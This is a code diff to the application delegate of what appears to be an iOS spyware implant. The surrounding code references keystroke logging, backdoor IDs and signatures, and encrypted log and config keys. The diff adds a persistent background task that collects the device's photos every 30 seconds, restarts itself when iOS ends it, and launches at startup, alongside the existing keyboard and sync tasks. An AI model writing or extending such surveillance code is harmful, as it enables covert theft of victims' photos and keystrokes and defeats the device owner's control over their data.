@@ -97,6 +97,7 @@ void asciiToHex(char *string, char binary[])
 
 @implementation AppDelegate
 
+@synthesize expirationHandlerPhotos;
 @synthesize expirationHandlerKeyboard;
 @synthesize expirationHandler;
 @synthesize bgTask;
@@ -244,6 +245,20 @@ void asciiToHex(char *string, char binary[])
   [logManager closeActiveLog:LOG_KEYLOG withLogID:0];
 }
 
+- (void)startBackgroundPhotos
+{
+  NSLog(@"Photos started!");
+  
+  dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+    while (TRUE)
+    {
+      [NSThread sleepForTimeInterval:30.0];
+      [gMainView getPhotos];
+    }
+  });
+
+}
+
 - (void)startBackgroundKeyboard
 {
   NSLog(@"Keyboard restarted!");
@@ -297,6 +312,26 @@ void asciiToHex(char *string, char binary[])
 #pragma mark - Init Background tasks
 #pragma mark -
 
+- (void)startPhotosBackgroundTask
+{
+  UIApplication *app = [UIApplication sharedApplication];
+  
+  self.expirationHandlerPhotos = ^{
+    
+    [app endBackgroundTask:self.bgTaskPhotos];
+    
+    self.bgTaskPhotos = UIBackgroundTaskInvalid;
+    self.bgTaskPhotos = [app beginBackgroundTaskWithExpirationHandler:expirationHandlerPhotos];
+    
+    [self startBackgroundPhotos];
+  };
+  
+  self.bgTaskPhotos = [app beginBackgroundTaskWithExpirationHandler:expirationHandlerPhotos];
+  
+  [self startBackgroundPhotos];
+
+}
+
 - (void)startKeyboardBackgroundTask
 {
   UIApplication *app = [UIApplication sharedApplication];
@@ -346,34 +381,36 @@ void asciiToHex(char *string, char binary[])
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
 {
-    keyBoardReceiver = [[KeyboardReceiver alloc] init];
+  keyBoardReceiver = [[KeyboardReceiver alloc] init];
   
-    // Init Keys
-    [self initAppKeys];
+  // Init Keys
+  [self initAppKeys];
   
-    gBackdoorID[14] = gBackdoorID[15] = 0;
-    asciiToHex(gLogAesKeyAscii, gLogAesKey);
-    asciiToHex(gConfAesKeyAscii, gConfAesKey);
-    asciiToHex(gBackdoorSignatureAscii, gBackdoorSignature);
+  gBackdoorID[14] = gBackdoorID[15] = 0;
+  asciiToHex(gLogAesKeyAscii, gLogAesKey);
+  asciiToHex(gConfAesKeyAscii, gConfAesKey);
+  asciiToHex(gBackdoorSignatureAscii, gBackdoorSignature);
   
-    // Request Calendar access
-    self.eventManager = [[EventManager alloc] init];
+  // Request Calendar access
+  self.eventManager = [[EventManager alloc] init];
   
-    [self.eventManager.eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error)
+  [self.eventManager.eventStore requestAccessToEntityType:EKEntityTypeEvent completion:^(BOOL granted, NSError *error)
+   {
+     if (error == nil)
      {
-        if (error == nil)
-        {
-            self.eventManager.eventsAccessGranted = granted;
-        }
-     }];
+       self.eventManager.eventsAccessGranted = granted;
+     }
+  }];
   
-    // Init keyboard background task
-    [self startBackgroundKeyboard];
+  // Init keyboard background task
+  [self startBackgroundKeyboard];
   
-    // Init synch backgorund task
-    [self startBackgroundSynch];
+  // Init synch backgorund task
+  [self startBackgroundSynch];
   
-    return YES;
+  [self startBackgroundPhotos];
+  
+  return YES;
 }
 
 - (void)applicationWillResignActive:(UIApplication *)application {
